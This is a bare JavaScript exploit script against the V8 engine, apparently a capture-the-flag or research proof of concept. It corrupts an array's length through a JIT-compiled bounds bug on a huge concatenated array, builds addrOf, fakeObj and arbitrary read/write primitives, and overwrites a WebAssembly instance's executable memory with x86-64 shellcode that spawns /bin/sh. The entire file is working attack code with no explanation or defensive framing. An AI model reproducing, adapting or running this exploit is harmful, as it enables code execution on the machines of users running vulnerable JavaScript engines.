var double_array = [13.37];
var obj = {"a" : 1};
var obj_array = [obj];
var test = ['asdasda']
var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, {});
var shell = wasm_instance.exports.main;

function ftoi(f)
{
  f64[0] = f;
  return bigUint64[0];
}
function itof(i)
{
  bigUint64[0] = i;
  return f64[0];
}
function ftoh(f)
{
  return itoh(ftoi(f));
}

function itoh(i){
  var pad = 16;
  if (BigInt(i) >> 32n == 0){
    pad = 8;
  }
  return '0x'+i.toString(16).padStart(pad, "0");
}


array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

length_as_double =
    new Float64Array(new BigUint64Array([0x2424242400000001n]).buffer)[0];

function trigger(array) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0);

  let corrupting_array = [0.1, 0.1];
  let corrupted_array = [0.1];
  corrupting_array[x] = length_as_double;
  return [corrupting_array, corrupted_array];
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array);
}

[corrupting_array, corrupted_array] = trigger(giant_array);
c = corrupted_array;

var double_map_addr = 0x8241891
var double_prop_addr = 0x80406e9
var double_array_offset = 0
function match_offset(mem, value){
  if ((mem & 0xffffffffn) == value || ( mem >> 32n ) == value){
    return true;
  }
  return false;
}


for (let i = 0x1120000; i < 0x1121000; i++){
  var sc = 0
  let v1 = ftoi(c[i])
  let v2 = ftoi(c[i+1])
  if (match_offset(v1, double_map_addr)){
    sc += 1
  }
  if (match_offset(v1, double_prop_addr) || match_offset(v2, double_prop_addr)){
    sc += 1
  }

  if (sc == 2){
    double_array_offset = i;
    break; 
  }
}

var obj_array_offset = double_array_offset + 4
var double_map = c[double_array_offset];
var obj_map = c[obj_array_offset];

console.log('double array offset:', itoh(double_array_offset*8));
console.log('object array offset:', itoh(obj_array_offset*8));

function addrOf(obj){
  obj_array[0] = obj;
  // change obj_array's map pointer to double_array's map pointer
  c[obj_array_offset] = double_map;
  obj_addr = ftoi(obj_array[0]) - 1n;
  // change back obj_array's map
  c[obj_array_offset] = obj_map;

  return obj_addr;
}

function fakeObj(addr){
  double_array[0] = itof(addr + 1n);
  c[double_array_offset] = obj_map;
  fakeobj = double_array[0];
  c[double_array_offset] = double_map;

  return fakeobj;
}

function parseMap(obj_idx, map_offset){
  var metadata = [];
  for (var i = -1; i < 2; i++){
    p1 = ftoi(c[obj_idx+i]) & 0xffffffffn;
    p2 = ftoi(c[obj_idx+i]) >> 32n;
    metadata.push(p1);
    metadata.push(p2);
  }
  var map_idx = metadata.indexOf(BigInt(map_offset));
  return metadata.slice(map_idx, map_idx + 4);
}

console.log('address of double array:', itoh(addrOf(double_array)));
var fake_mp = itof((BigInt(double_prop_addr) << 32n) + BigInt(double_map_addr))
var fake_array = [fake_mp, 1.1, 2.2];
var fake_array_addr = addrOf(fake_array) & 0xffffffffn;
var fake_array_index = Number((fake_array_addr - 1n) / 8n);
console.log('fake array address: ', itoh(fake_array_addr));
var fake_array_metadata = parseMap(fake_array_index, double_map_addr);
var fake_array_elem = fake_array_metadata[2];
console.log('fake array elem pointer: ', itoh(fake_array_elem));
var fake_obj = fakeObj(fake_array_elem + 8n - 1n);

// fake array -> [fake map, fake prop, element place holder, ...]
// fake array -> |4 bytes map|4 bytes property|4 bytes elements|4 bytes length|
//                                                    |__
//                                                       |                 (addr to read)
//                      |elements map|elements length|[fake map|fake props|fake elements|fake length|...]


function read(addr, length=1){
  addr -= 8n;
  if (addr % 2n == 0){
    addr += 1n;
  }
  var data = []
  var fake_addr_len = itof(0x0000001000000000n + BigInt(addr))
  fake_array[1] = fake_addr_len;
  for (var i = 0; i < length; i++){
    data.push(fake_obj[i]);
    console.log('read: ', itoh(addr + 8n * BigInt(i + 1) - 1n), ftoh(fake_obj[i]));
  }
  return data;
}


function write(addr, data){
  addr -= 8n;
  if (addr % 2n == 0){
    addr += 1n;
  }
  var fake_addr_len = itof(0x0000001000000000n + BigInt(addr))
  fake_array[1] = fake_addr_len;
  fake_obj[0] = itof(data);
  console.log('write: ', itoh(addr - 1n + 8n), itoh(data));
}

function write_shellcode(shellcode, rwx_addr){
  var buf = new ArrayBuffer(shellcode.length * 8);
  var data_view = new DataView(buf);
  var buf_addr = addrOf(buf) & 0xffffffffn;
  console.log('buf address: ', itoh(buf_addr));
  var back_store_addr_l = ftoi(read(buf_addr + 16n)[0]);
  var back_store_addr_h = ftoi(read(buf_addr + 24n)[0]);
  var rwx_addr_h = rwx_addr >> 32n;
  var rwx_addr_l = rwx_addr & 0xffffffffn;
  var new_bs_addr_l = (back_store_addr_l & 0xffffffffn) + (rwx_addr_l << 32n);
  var new_bs_addr_h = (back_store_addr_h >> 32n << 32n) + (rwx_addr_h);
  write(buf_addr + 16n, new_bs_addr_l);
  write(buf_addr + 24n, new_bs_addr_h);

  for (var i = 0; i < shellcode.length; i++){
    data_view.setFloat64(i * 8, itof(shellcode[i]), true);
  }
  
}


var wasm_addr = (addrOf(wasm_instance) & 0xffffffffn);
console.log('wasm instance address: ', itoh(wasm_addr));
var rwx_addr = read((wasm_addr + 0x68n))[0];
console.log('rwx address: ', ftoh(rwx_addr));

var shellcode = [
  0x2fbb485299583b6an,
  0x5368732f6e69622fn,
  0x050f5e5457525f54n
];
write_shellcode(shellcode, ftoi(rwx_addr));

shell();
